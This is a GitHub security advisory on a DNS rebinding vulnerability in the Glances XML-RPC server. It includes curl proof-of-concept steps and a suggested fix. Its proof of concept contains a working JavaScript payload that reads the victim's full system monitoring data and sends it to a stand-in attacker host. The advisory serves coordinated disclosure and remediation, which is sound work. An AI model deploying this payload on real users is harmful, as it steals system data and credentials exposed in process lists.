# [M] Glances: XML-RPC Server Missing Host Header Validation Enables DNS Rebinding Attack

## Summary
Severity: Medium
Advisory: GHSA-w856-8p3r-p338
CVE: CVE-2026-46611
CWE: CWE-346, CWE-350
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-06-22
Source: https://github.com/advisories/GHSA-w856-8p3r-p338
Type: github-advisory

## Affected
- PyPI: `glances` — affected >=0 <4.5.5

## Details
### Summary

The Glances XML-RPC server (`glances -s`, implemented in `glances/server.py`) does not validate the HTTP `Host` header, leaving it vulnerable to DNS rebinding attacks.  CVE-2026-32632 (patched in 4.5.2) added `TrustedHostMiddleware` to the REST/WebUI server; the MCP server has had equivalent protection since 4.5.1. The XML-RPC server received neither fix and has no `allowed-hosts` configuration key.  Combined with the unrestricted `Access-Control-Allow-Origin: *` header (see companion advisory for CVE-2026-33533 and its incomplete fix), an attacker can exploit DNS rebinding to exfiltrate the full system monitoring dataset from a victim's browser.

---

### Details

**Affected component:** `glances/server.py` — `GlancesXMLRPCHandler` / `GlancesXMLRPCServer`

**Direct URL (commit 04579778e733d705898a169e049dc84772c852da):**
- https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/server.py

Contrast — patched backends:
- https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/outputs/glances_restful_api.py
- https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/outputs/glances_mcp.py

The `GlancesXMLRPCHandler` class inherits from Python's `xmlrpc.server.SimpleXMLRPCRequestHandler` and does not override `parse_request()` to inspect or validate the `Host` header.

Contrast this with the two other Glances server backends, both of which received host-validation hardening:

**REST / WebUI server** (`glances/outputs/glances_restful_api.py`) — patched in 4.5.2:

```python
# glances_restful_api.py
if self.webui_allowed_hosts:
    self._app.add_middleware(
        TrustedHostMiddleware,
        allowed_hosts=self.webui_allowed_hosts,
    )
```

**MCP server** (`glances/outputs/glances_mcp.py`) — protected since 4.5.1:

```python
# glances_mcp.py
TransportSecuritySettings(
    allowed_hosts=self.mcp_allowed_hosts,
    ...
)
```

**XML-RPC server** (`glances/server.py`) — no equivalent exists:

```python
class GlancesXMLRPCHandler(SimpleXMLRPCRequestHandler, GlancesAPI):
    # No Host header check; any Host value is accepted
    rpc_paths = ('/RPC2',)
    ...
```

There is no `xmlrpc_allowed_hosts` (or equivalent) configuration key in `glances.conf`, and the server ignores the `Host` header on every incoming request.

**Confirmed on:** x86_64 Linux, Python 3.13, Glances 4.5.5_dev1 (commit 04579778e733d705898a169e049dc84772c852da).

Test results:

| Server type | Host header          | HTTP status | Data returned |
|-------------|----------------------|-------------|---------------|
| XML-RPC     | `attacker.example.com` | 200 OK    | Yes — VULNERABLE |
| XML-RPC     | `127.0.0.1:61209`    | 200 OK      | Yes (baseline)   |
| REST API    | `attacker.example.com` | 400 Bad Request | No — patched |

---

### PoC

**Attack overview**

DNS rebinding breaks the browser Same-Origin Policy by making `attacker.example.com` temporarily resolve to the target's IP address (e.g. `127.0.0.1`).  From that point the victim's browser treats the attacker's page as same-origin with `http://attacker.example.com:61209/RPC2`, forwarding the attacker-controlled `Host` header to the local Glances XML-RPC server, which accepts it without validation.

**Special configuration required**

No special `glances.conf` settings are needed.  The vulnerability is present in a default Glances XML-RPC server start (`glances -s`).  For the comparison test (Step 3) the REST server must also be started; that step requires Glances to be installed with web dependencies (`pip install "glances[web]"`).

---

**Step 1 — Start the Glances XML-RPC server**

```bash
glances -s -p 61209
```

**Step 2 — Confirm the server accepts an arbitrary Host header**

```bash
curl -s -D - -X POST "http://127.0.0.1:61209/RPC2" \
     -H "Host: attacker.example.com" \
     -H "Content-Type: text/plain" \
     -d '<?xml version="1.0"?>
         <methodCall><methodName>getAllPlugins</methodName></methodCall>'
```

Expected result (secure): `HTTP/1.0 400 Bad Request`
Actual result: `HTTP/1.0 200 OK` with full XML-RPC response body.

**Step 3 — Confirm the REST API is patched (comparison)**

```bash
# Start REST server with the same machine as allowed host:
glances -w -p 61210 --webui-port 61210

curl -s -o /dev/null -w "%{http_code}\n" \
     "http://127.0.0.1:61210/api/4/status" \
     -H "Host: attacker.example.com"
# Returns: 400   (TrustedHostMiddleware rejects the spoofed Host)
```

**Step 4 — Full DNS rebinding exploitation (real-world path)**

1. Attacker registers `attacker.example.com` with a low-TTL (1 second) DNS record initially pointing to their own server IP.
2. Attacker serves the following page from `http://attacker.example.com`:

```html
<script>
async function exfil() {
  const payload = `<?xml version="1.0"?>
    <methodCall><methodName>getAll</methodName></methodCall>`;
  try {
    const r = await fetch('http://attacker.example.com:61209/RPC2', {
      method:  'POST',
      headers: { 'Content-Type': 'text/plain' },
      body:    payload,
    });
    const data = await r.text();
    // data contains: hostname, OS, all processes with cmd-lines, network, disk
    await fetch('https://collect.attacker.example.com/?d=' + btoa(data));
  } catch (_) {}
}

// Wait for TTL to expire and DNS to rebind to 127.0.0.1, then call exfil()
setTimeout(exfil, 5000);
</script>
```

3. Victim visits `http://attacker.example.com` in their browser.
4. After TTL expiry, the attacker's DNS server responds with `127.0.0.1`.
5. The browser's `fetch()` call is sent to `127.0.0.1:61209` with `Host: attacker.example.com`; the XML-RPC server accepts it.
6. The `Access-Control-Allow-Origin: *` header (see companion advisory) allows the browser to read the response body.
7. The attacker receives the complete system monitoring snapshot.

Tools that simplify DNS rebinding for research/testing include:
- [Singularity](https://github.com/nccgroup/singularity)
- [rbndr.us](https://rbndr.us)

**Step 5 — Confirm absence of Host check in source**

```python
import sys, inspect
sys.path.insert(0, '/path/to/glances')   # adjust to local clone
import glances.server as s

src = inspect.getsource(s.GlancesXMLRPCHandler)
print('Host check present:', 'allowed_hosts' in src or 'Host' in src)
# Host check present: False
```

---

### Impact

**Vulnerability type:** Insufficient Verification of Data Authenticity / DNS Rebinding (CWE-350)

**Who is impacted:** Any user whose browser can reach a Glances XML-RPC server and who can be lured to visit an attacker controlled web page.  This includes deployments where:

- Glances is bound to `127.0.0.1` (loopback) — DNS rebinding bypasses the loopback restriction.
- Glances is bound to a LAN IP — any browser on that LAN is at risk.
- Glances is exposed on a public IP — any browser on the internet is at risk.

**Data exposed through the XML-RPC API** includes: hostname, OS and kernel version, full process list with command-line arguments (frequently containing API keys, database passwords, and access tokens passed as environment variables or CLI flags), CPU/memory/disk/network statistics, open file descriptors, listening ports, and Docker/Kubernetes container metadata.

**Impact:**
- **Confidentiality:** High — complete system monitoring data readable remotely without credentials.
- **Integrity:** None — read-only XML-RPC API.
- **Availability:** None — no denial-of-service component.

The attack is amplified by the companion CORS wildcard issue (vuln03): without `Access-Control-Allow-Origin: *`, the browser would still block the response read.  Both issues must be fixed together for effective remediation.

---

### Suggested Fix

**Option 1 — Add Host validation to the XML-RPC handler (preferred)**

Add a `webui_allowed_hosts` (or new `xmlrpc_allowed_hosts`) configuration key, and validate the `Host` header in `GlancesXMLRPCHandler`:

```python
# server.py
class GlancesXMLRPCHandler(SimpleXMLRPCRequestHandler, GlancesAPI):

    allowed_hosts: list[str] = []   # populated from config

    def parse_request(self) -> bool:
        if not super().parse_request():
            return False
        if self.allowed_hosts:
            host = self.headers.get('Host', '').split(':')[0]
            if host not in self.allowed_hosts:
                self.send_error(400, 'Bad Request: invalid Host header')
                return False
        return True
```

Populate `allowed_hosts` from the existing `webui_allowed_hosts` config key (already used by the REST server), so operators have a single knob.

**Option 2 — Deprecate and remove the XML-RPC server**

The XML-RPC server is a legacy interface.  The REST API (`glances -w`) provides a superset of functionality, is actively maintained, and has all current security controls.  Deprecating the XML-RPC server in the next major release and directing users to the REST API would eliminate this attack surface entirely.

---

### Responsible Disclosure
The AFINE Team is committed to responsible / coordinated disclosure.  The AFINE Team will not publish details of this vulnerability or release exploit code publicly until a fix has been released, or 90 days have elapsed from the date of this report, whichever comes first. 
---

### Credits

This issue was identified by Michał Majchrowicz and Marcin Wyczechowski, members of the AFINE Team.

---

## References
- https://github.com/nicolargo/glances/security/advisories/GHSA-w856-8p3r-p338
- https://nvd.nist.gov/vuln/detail/CVE-2026-46611
- https://github.com/advisories/GHSA-w856-8p3r-p338
- https://github.com/nicolargo/glances
- https://github.com/nicolargo/glances/releases/tag/v4.5.5
- https://github.com/pypa/advisory-database/tree/main/vulns/glances/PYSEC-2026-2498.yaml
- https://pypi.org/project/glances
